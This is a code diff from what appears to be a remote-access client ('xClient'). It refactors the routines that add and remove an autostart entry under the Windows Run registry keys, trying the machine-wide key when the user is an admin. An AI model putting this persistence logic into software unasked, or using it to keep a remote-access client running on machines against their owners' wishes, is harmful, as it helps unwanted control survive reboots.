@@ -11,17 +11,17 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.AddRegistryKeyValue(Registry.LocalMachine,
+                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
 
                 if (success) return true;
 
-                return RegistryKeyHelper.AddRegistryKeyValue(Registry.CurrentUser,
+                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
             }
             else
             {
-                return RegistryKeyHelper.AddRegistryKeyValue(Registry.CurrentUser,
+                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath);
             }
         }
@@ -30,17 +30,17 @@ namespace xClient.Core.Installation
         {
             if (WindowsAccountHelper.GetAccountType() == "Admin")
             {
-                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(Registry.LocalMachine,
+                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
 
                 if (success) return true;
 
-                return RegistryKeyHelper.DeleteRegistryKeyValue(Registry.CurrentUser,
+                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
             }
             else
             {
-                return RegistryKeyHelper.DeleteRegistryKeyValue(Registry.CurrentUser,
+                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
             }
         }
